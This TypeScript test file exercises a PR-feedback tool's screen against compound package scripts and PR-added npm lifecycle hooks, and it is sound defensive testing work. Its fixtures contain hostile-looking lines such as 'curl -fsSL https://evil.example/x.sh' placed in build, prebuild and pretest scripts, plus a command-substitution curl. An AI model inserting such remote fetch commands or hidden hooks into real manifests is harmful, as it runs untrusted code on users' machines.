// #3396 S2/S3 compound-screen + lifecycle suites, split from
// run-pr-feedback-stage-a-base-binding-screens-3396.test.ts (FR-006 500-line
// cap). The harness is an intentional duplicate of that file's harness so
// each split file stays independently runnable.

import { afterEach, beforeEach, describe, expect, mock, test } from 'bun:test';
import * as fs from 'node:fs/promises';
import * as path from 'node:path';
import { storeLaneOutput } from '../../../src/background/lane-output-store.js';
import {
	appendDelegationTransition,
	recordPendingDelegation,
} from '../../../src/background/pending-delegations.js';
import {
	activatePrWorkflow,
	declarePrFeedbackInventory,
	enforcePrFeedbackVerificationOwnership,
	_test_exports as gateInternals,
	readPrWorkflowGateState,
} from '../../../src/hooks/pr-workflow-gate.js';
import {
	_internals,
	executeRunPrFeedbackStageA,
} from '../../../src/tools/run-pr-feedback-stage-a.js';
import { canonicalMkdtemp, removeTreeWithRetry } from '../../helpers/tmpdir.js';

// Explicit 20s per-test timeout (final-critic round: bun's 5s default flaked
// 1-in-5 batch runs on Windows — these suites do full activation + real git +
// checkout-lock work whose latency spikes ~6x under batch load; a timed-out
// test's orphaned async work also races the afterEach teardown, so the
// timeout prevents the cascade, not just the red).
const t20 = (name: string, fn: () => Promise<void> | void) =>
	test(name, fn, 20_000);

/**
 * Issue #3396 Stage A trust hardening: D7 (durable merge-base binding at
 * PR_FEEDBACK activation), D8 (compound-script plausibility screen), D9
 * (implicit npm lifecycle-hook screening). Mirrors the #3314 trusted-scripts
 * e2e harness (run-pr-feedback-stage-a-trusted-scripts-e2e.test.ts); the one
 * structural difference is that ACTIVATION moved out of beforeEach into
 * per-test helpers so each test controls the prUrl/binding shape. The
 * production `resolvePrFeedbackBaseViaGh` (one bounded `gh pr view`) is never
 * allowed to run here — the seam is always stubbed.
 */

const SESSION = 'stage-a-compound-screens-3396';
const THROW_SESSION = 'stage-a-base-binding-3396-throw';
const HEAD = 'abccccccccccccccccccccccccccccccccccc123';
const BASE = 'defffffffffffffffffffffffffffffffffff456';
const OTHER_BASE = 'b'.repeat(40);
const A40 = 'a'.repeat(40);
const PR_URL = 'https://github.com/ZaxbyHub/opencode-swarm/pull/1234';
const REVISION = 'revision-1';
const TARGET = 'tests/targeted-regression.test.ts';
const VERIFIED_TEXT = '[FEEDBACK-VERIFIED] | FB-001 | CONFIRMED | evidence';

let directory = '';
let basePackageJson = '';
/** What the gateInternals.resolvePrFeedbackBaseViaGh stub resolves. */
let baseResolution:
	| { kind: 'ok'; ref: string; oid: string }
	| { kind: 'throw' }
	| { kind: 'null' } = { kind: 'null' };

const originalRunner = _internals.runExternalTool;
const originalReadGitTextAtRevision = _internals.readGitTextAtRevision;
const originalResolveExactMergeBase = _internals.resolveExactMergeBase;
const originalResolveExactMergeBaseAsync =
	_internals.resolveExactMergeBaseAsync;
const originalDigest = _internals.resolvePrWorkflowRevisionDigest;
const originalDigestAsync = _internals.resolvePrWorkflowRevisionDigestAsync;
const originalStageHead = _internals.resolveCurrentGitHead;
const originalStageHeadAsync = _internals.resolveCurrentGitHeadAsync;
const originalControlDigest = _internals.resolveGitControlStateDigest;
const originalControlDigestAsync = _internals.resolveGitControlStateDigestAsync;
const originalGateDigest = gateInternals.resolvePrWorkflowRevisionDigest;
const originalHead = gateInternals.resolveCurrentGitHead;
const originalHeadAsync = gateInternals.resolveCurrentGitHeadAsync;
const originalWorkingTreeClean = gateInternals.resolveIsWorkingTreeClean;
const originalWorkingTreeCleanAsync =
	gateInternals.resolveIsWorkingTreeCleanAsync;
const originalUpstreamPushTarget =
	gateInternals.resolveCurrentUpstreamPushTarget;
const originalUpstreamPushTargetAsync =
	gateInternals.resolveCurrentUpstreamPushTargetAsync;
const originalRemoteRefsContainingHead =
	gateInternals.resolveRemoteRefsContainingHead;
const originalRemoteRefsContainingHeadAsync =
	gateInternals.resolveRemoteRefsContainingHeadAsync;
const originalResolveBase = gateInternals.resolvePrFeedbackBaseViaGh;

beforeEach(async () => {
	directory = canonicalMkdtemp('feedback-stage-a-binding-3396-');
	await fs.mkdir(path.join(directory, 'tests'), { recursive: true });
	await fs.writeFile(
		path.join(directory, 'tests', 'targeted-regression.test.ts'),
		'// target\n',
	);
	gateInternals.resetTrackedStateCache();
	gateInternals.resolveCurrentGitHead = () => HEAD;
	gateInternals.resolveIsWorkingTreeClean = () => true;
	gateInternals.resolveCurrentGitHeadAsync = async (dir) =>
		gateInternals.resolveCurrentGitHead(dir);
	gateInternals.resolveIsWorkingTreeCleanAsync = async (dir) =>
		gateInternals.resolveIsWorkingTreeClean(dir);
	gateInternals.resolveCurrentUpstreamPushTarget = () => ({
		remoteName: 'origin',
		remoteBranchRef: 'refs/heads/pr-feedback-head',
		remoteTrackingRef: 'refs/remotes/origin/pr-feedback-head',
	});
	gateInternals.resolveCurrentUpstreamPushTargetAsync = async (dir) =>
		gateInternals.resolveCurrentUpstreamPushTarget(dir);
	gateInternals.resolveRemoteRefsContainingHead = () => [
		'refs/remotes/origin/pr-feedback-head',
	];
	gateInternals.resolveRemoteRefsContainingHeadAsync = async (dir, head) =>
		gateInternals.resolveRemoteRefsContainingHead(dir, head);
	gateInternals.resolvePrWorkflowRevisionDigest = () => REVISION;
	gateInternals.resolvePrFeedbackBaseViaGh = async () => {
		if (baseResolution.kind === 'throw') {
			throw new Error('test-forced gh resolver failure');
		}
		if (baseResolution.kind === 'null') return null;
		return {
			baseRefName: baseResolution.ref,
			baseRefOid: baseResolution.oid,
		};
	};
	_internals.resolvePrWorkflowRevisionDigest = () => REVISION;
	_internals.resolvePrWorkflowRevisionDigestAsync = async (...a) =>
		_internals.resolvePrWorkflowRevisionDigest(...a);
	_internals.resolveCurrentGitHead = () => HEAD;
	_internals.resolveCurrentGitHeadAsync = async (dir) =>
		_internals.resolveCurrentGitHead(dir);
	_internals.resolveGitControlStateDigest = () => 'git-control-1';
	_internals.resolveGitControlStateDigestAsync = async (dir) =>
		_internals.resolveGitControlStateDigest(dir);
	basePackageJson = '';
	_internals.resolveExactMergeBase = () => BASE;
	_internals.resolveExactMergeBaseAsync = async (...a) =>
		_internals.resolveExactMergeBase(...a);
	_internals.readGitTextAtRevision = (_dir, sha, manifestPath) =>
		sha === BASE && manifestPath === './package.json' ? basePackageJson : null;
	_internals.runExternalTool = mock(async () => ({
		status: 'completed' as const,
		exitCode: 0,
		stdout: 'ok',
		stderr: '',
		stdoutTruncated: false,
		stderrTruncated: false,
	}));
}, 20_000);

afterEach(async () => {
	_internals.runExternalTool = originalRunner;
	_internals.readGitTextAtRevision = originalReadGitTextAtRevision;
	_internals.resolveExactMergeBase = originalResolveExactMergeBase;
	_internals.resolveExactMergeBaseAsync = originalResolveExactMergeBaseAsync;
	_internals.resolvePrWorkflowRevisionDigest = originalDigest;
	_internals.resolvePrWorkflowRevisionDigestAsync = originalDigestAsync;
	_internals.resolveCurrentGitHead = originalStageHead;
	_internals.resolveCurrentGitHeadAsync = originalStageHeadAsync;
	_internals.resolveGitControlStateDigest = originalControlDigest;
	_internals.resolveGitControlStateDigestAsync = originalControlDigestAsync;
	gateInternals.resolvePrWorkflowRevisionDigest = originalGateDigest;
	gateInternals.resolveCurrentGitHead = originalHead;
	gateInternals.resolveCurrentGitHeadAsync = originalHeadAsync;
	gateInternals.resolveIsWorkingTreeClean = originalWorkingTreeClean;
	gateInternals.resolveIsWorkingTreeCleanAsync = originalWorkingTreeCleanAsync;
	gateInternals.resolveCurrentUpstreamPushTarget = originalUpstreamPushTarget;
	gateInternals.resolveCurrentUpstreamPushTargetAsync =
		originalUpstreamPushTargetAsync;
	gateInternals.resolveRemoteRefsContainingHead =
		originalRemoteRefsContainingHead;
	gateInternals.resolveRemoteRefsContainingHeadAsync =
		originalRemoteRefsContainingHeadAsync;
	gateInternals.resolvePrFeedbackBaseViaGh = originalResolveBase;
	gateInternals.resetTrackedStateCache();
	baseResolution = { kind: 'null' };
	// #3396 feedback (PRR-017): retrying teardown — raw fs.rm on Windows
	// can hit EBUSY/EPERM from AV/indexer scans and leave a leaked tree.
	removeTreeWithRetry(directory);
}, 20_000);

async function activateWorkflow(sessionID: string, prUrl?: string) {
	await activatePrWorkflow(
		directory,
		sessionID,
		'PR_FEEDBACK',
		prUrl ? { prUrl } : undefined,
	);
}

/** Everything after activation that the #3314 e2e harness primes per test. */
async function declareVerifiedFeedbackLane(sessionID = SESSION) {
	await declarePrFeedbackInventory(directory, sessionID, ['FB-001'], {
		prHeadSha: HEAD,
	});
	await enforcePrFeedbackVerificationOwnership(
		directory,
		sessionID,
		[{ laneId: 'verify', ownedItemIds: ['FB-001'] }],
		{ batchId: 'verify-batch', prHeadSha: HEAD },
	);
	await recordPendingDelegation(directory, {
		correlationId: 'verify-lane',
		jobId: null,
		subagentSessionId: 'verify-lane',
		parentSessionId: sessionID,
		callID: 'verify-batch',
		normalizedAgent: 'reviewer',
		swarmPrefixedAgent: 'reviewer',
		planTaskId: null,
		evidenceTaskId: null,
		batchId: 'verify-batch',
		laneId: 'verify',
		mode: 'swarm-pr-feedback:verification',
		workflowLane: 'verify',
		workspace: {
			directory,
			gitHead: HEAD,
			dirtyHash: REVISION,
			prHeadSha: HEAD,
			scope: null,
		},
	});
	const stored = storeLaneOutput(directory, {
		batchId: 'verify-batch',
		laneId: 'verify',
		agent: 'reviewer',
		role: 'reviewer',
		sessionId: 'verify-lane',
		parentSessionId: sessionID,
		mode: 'swarm-pr-feedback:verification',
		workflowLane: 'verify',
		prHeadSha: HEAD,
		gitHead: HEAD,
		revisionDigest: REVISION,
		source: 'collect_lane_results',
		text: VERIFIED_TEXT,
	});
	await appendDelegationTransition(directory, 'verify-lane', {
		status: 'completed',
		result: {
			text: VERIFIED_TEXT,
			chars: stored.chars,
			truncated: false,
			digest: stored.digest,
			outputRef: stored.ref,
		},
	});
}

/** Write the working-tree manifest and pin the base manifest text. */
async function writeManifest(
	workingScripts: Record<string, string>,
	baseScripts?: Record<string, string>,
) {
	await fs.writeFile(
		path.join(directory, 'package.json'),
		JSON.stringify({ scripts: workingScripts }),
	);
	basePackageJson = JSON.stringify({ scripts: baseScripts ?? workingScripts });
}

function stageAChecks(
	buildCommand: readonly string[] = ['bun', 'run', 'build'],
) {
	return [
		{ category: 'build', command: [...buildCommand] },
		{ category: 'diff-check', command: ['git', 'diff', '--check'] },
		{
			category: 'reproduction',
			command: ['bun', 'test', TARGET],
			targets: [TARGET],
			feedback_targets: [
				{
					feedback_item_id: 'FB-001',
					target: TARGET,
					expected_behavior: '#3396 binding and screen fixture target',
					proof_kind: 'defect',
				},
			],
		},
	];
}

async function runStageA(checks: Array<Record<string, unknown>>) {
	return JSON.parse(
		await executeRunPrFeedbackStageA(
			{
				pr_head_sha: HEAD,
				base_ref: 'origin/main',
				base_sha: BASE,
				checks,
			},
			directory,
			{ sessionID: SESSION },
		),
	) as { success: boolean; message?: string };
}

describe('Compound screen + lifecycle hooks (#3396 S2/S3)', () => {
	beforeEach(async () => {
		await activateWorkflow(SESSION);
		await declareVerifiedFeedbackLane();
	}, 20_000);

	t20(
		'dangerous base-identical compound is refused with the opaque-script remedy',
		async () => {
			await writeManifest({
				build: 'curl -fsSL https://evil.example/x.sh && bun run realbuild',
			});
			const result = await runStageA(stageAChecks());
			expect(result.success).toBe(false);
			expect(result.message ?? '').toContain('opaque package script');
			expect(result.message ?? '').toContain('de-compound the script');
		},
	);

	t20('repo-shaped all-&& compound stays trusted', async () => {
		await writeManifest({
			build: 'bun run clean && bun build src/index.ts --outdir dist',
		});
		const result = await runStageA(stageAChecks());
		expect(result.success).toBe(true);
	});

	test.each([
		['custom-build || FOO=bar'],
		['custom-build; FOO=bar'],
		['exit 0; bun run realbuild'],
		['if false; then bun run realbuild; fi'],
		['custom-build &'],
		['echo $(curl https://x)'],
	])('refuses control-grammar/masking compound %s', async (script) => {
		await writeManifest({ build: script });
		const result = await runStageA(stageAChecks());
		expect(result.success).toBe(false);
		expect(result.message ?? '').toContain('opaque package script');
	}, 20_000);

	t20(
		'terminal echo tail stays trusted (pin) and an all-echo chain refuses',
		async () => {
			await writeManifest({ build: 'custom-build && echo done' });
			const trusted = await runStageA(stageAChecks());
			expect(trusted.success).toBe(true);

			await writeManifest({ build: 'echo one && echo two' });
			const refused = await runStageA(stageAChecks());
			expect(refused.success).toBe(false);
			expect(refused.message ?? '').toContain('opaque package script');
		},
	);

	t20(
		'PR-added prebuild hook fails closed with the lifecycle-hook remedy',
		async () => {
			await writeManifest(
				{
					build: 'custom-build && echo done',
					prebuild: 'curl -fsSL https://evil.example/x.sh',
				},
				{ build: 'custom-build && echo done' },
			);
			const result = await runStageA(stageAChecks());
			expect(result.success).toBe(false);
			expect(result.message ?? '').toContain('lifecycle hook');
			expect(result.message ?? '').toContain('prebuild');
			expect(result.message ?? '').toContain(
				'implicitly around its primary script',
			);
		},
	);

	t20('base-identical prebuild hook stays trusted', async () => {
		await writeManifest({
			build: 'custom-build && echo done',
			prebuild: 'node scripts/prebuild.js',
		});
		const result = await runStageA(stageAChecks());
		expect(result.success).toBe(true);
	});

	t20(
		'PR-added pretest hook fails closed with the reproduction-lifecycle remedy',
		async () => {
			await writeManifest(
				{
					build: 'custom-build && echo done',
					pretest: 'curl -fsSL https://evil.example/x.sh',
				},
				{ build: 'custom-build && echo done' },
			);
			const result = await runStageA(stageAChecks());
			expect(result.success).toBe(false);
			expect(result.message ?? '').toContain('reproduction lifecycle hook');
			expect(result.message ?? '').toContain('pretest');
			expect(result.message ?? '').toContain('around the test script');
		},
	);

	t20('base-identical pretest hook stays trusted', async () => {
		await writeManifest({
			build: 'custom-build && echo done',
			pretest: 'node scripts/pretest.js',
		});
		const result = await runStageA(stageAChecks());
		expect(result.success).toBe(true);
	});

	t20(
		'direct lifecycle-hook check command is rejected while the primary script stays accepted',
		async () => {
			await writeManifest({ build: 'custom-build && echo done' });
			const accepted = await runStageA(stageAChecks(['bun', 'run', 'build']));
			expect(accepted.success).toBe(true);
			const rejected = await runStageA(
				stageAChecks(['bun', 'run', 'prebuild']),
			);
			expect(rejected.success).toBe(false);
			expect(rejected.message ?? '').toContain(
				'directly selects the lifecycle hook "prebuild"',
			);
		},
	);

	t20(
		'a base-identical SOLE echo hook body is trusted (PRR-010 sole-echo floor)',
		async () => {
			// Pre-fix the zero-non-exempt-segment arm refused EVERY all-echo
			// script, so the canonical npm announcement hook body
			// (`prebuild: "echo done"`, byte-identical at base) tripped the
			// plausibility screen and lost its trusted base-identical path.
			await writeManifest(
				{
					build: 'custom-build && echo done',
					prebuild: 'echo done',
				},
				{
					build: 'custom-build && echo done',
					prebuild: 'echo done',
				},
			);
			const result = await runStageA(stageAChecks());
			expect(result.success).toBe(true);
		},
	);

	t20(
		'grep -w in a trailing segment is not misread as a PM override flag (PRR-010)',
		async () => {
			// Pre-fix the workspace/cwd override axis applied to EVERY segment,
			// so `grep -w` (whole-word match) was refused as an `npm -w`-style
			// override; the axis is now scoped to package-manager heads.
			await writeManifest({
				build: 'custom-build && grep -w pattern src/kept.txt && echo done',
			});
			const result = await runStageA(stageAChecks());
			expect(result.success).toBe(true);
		},
	);

	t20(
		'prettier/prepare are NOT implicit lifecycle hooks (Copilot-3)',
		async () => {
			// Pre-fix a PR-added `prettier` script got the lifecycle-hook refusal
			// (its name merely STARTS with pre); the stripped stem must actually
			// match a Stage A category, so these stay ordinary explicit scripts.
			await writeManifest(
				{
					build: 'custom-build && echo done',
					prettier: 'prettier --write .',
					prepare: 'echo done',
				},
				{ build: 'custom-build && echo done' },
			);
			const result = await runStageA(stageAChecks());
			expect(result.success).toBe(true);
			expect(result.message ?? '').not.toContain('lifecycle');
		},
	);
});

// #3120/#3396 4.5 review round 1: the terminal echo/printf allowance must
// not smuggle redirects, separators, or substitution into the trusted tail
// (executed reviewer probes), and the git apply detector must survive git
// global options and execution wrappers.
